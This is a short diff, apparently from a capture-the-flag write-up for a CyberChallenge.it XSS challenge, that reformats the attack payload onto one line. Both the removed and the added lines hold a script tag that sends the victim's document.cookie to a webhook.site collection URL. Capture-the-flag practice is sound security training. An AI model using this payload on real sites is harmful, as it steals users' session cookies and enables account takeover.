@@ -14,7 +14,5 @@ http://xss1.challs.cyberchallenge.it/report?url=http%3A%2F%2Fxss1.challs.cyberch
 ```
 
 ```
-<script>
-    fetch("https://webhook.site/273ce221-3915-4d76-80fe-8353bb5cc526/"+document.cookie);
-</script>
+<script>fetch("https://webhook.site/273ce221-3915-4d76-80fe-8353bb5cc526/"+document.cookie);</script>
 ```
